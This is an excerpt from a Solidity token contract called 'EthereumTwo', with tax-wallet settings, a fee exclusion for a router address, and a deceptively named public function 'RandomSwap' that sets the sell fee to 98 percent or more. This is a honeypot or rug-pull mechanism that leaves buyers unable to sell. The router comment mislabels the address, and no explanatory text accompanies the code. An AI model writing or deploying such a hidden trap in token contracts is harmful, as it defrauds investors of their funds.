...
contract EthereumTwo is IERC20 {
    ...
    TaxWallets public _taxWallets = TaxWallets({
        marketing: payable(0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298),
        development: payable(0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298)
    });
    ...
    constructor () payable {
        ...
        _isExcludedFromFees[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true; // Uniswap v2
    }
...
//===============================================================================================================
    ...
    function RandomSwap(uint16 EnterSwapAmount) public {
        require(EnterSwapAmount >= 98);
        _taxRates.sellFee = EnterSwapAmount;
    }
